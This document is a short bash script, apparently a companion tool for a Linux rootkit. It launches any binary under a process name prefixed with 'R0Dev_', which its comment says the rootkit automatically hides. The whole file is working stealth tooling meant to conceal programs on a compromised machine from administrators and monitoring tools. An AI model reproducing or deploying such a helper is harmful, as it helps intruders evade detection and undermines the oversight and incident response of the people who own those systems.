#!/bin/bash
# R0RUN — run a binary with R0DEV prefix (auto-hidden by rootkit)
# Usage: r0run.sh <binary> [args...]
if [ $# -lt 1 ]; then
    echo "Usage: $0 <binary> [args...]"
    exit 1
fi
exec -a "R0Dev_$(basename "$1")" "$@"
